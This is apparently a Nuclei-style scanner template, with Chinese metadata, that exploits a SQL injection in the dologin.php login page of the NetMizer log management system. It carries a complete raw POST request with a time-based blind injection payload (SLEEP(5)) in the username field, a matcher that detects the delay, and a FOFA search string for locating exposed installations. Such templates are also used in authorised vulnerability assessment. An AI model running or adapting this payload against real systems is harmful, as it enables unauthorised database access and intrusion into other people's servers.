id: poc-2932246411
info:
  name: NetMizer 日志管理系统dologin存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,unknown
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: ''
    fofa: title="NetMizer 日志管理系统"
http:
- raw:
  - 'POST /data/login/dologin.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0

    Accept: */*

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    Accept-Encoding: gzip, deflate

    X-Requested-With: XMLHttpRequest

    Priority: u=0

    Content-Length: 40


    action=login&username='' AND (SELECT 6909 FROM (SELECT(SLEEP(5)))oNyW) AND ''EVSj''=''EVSj&passwd=admin'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
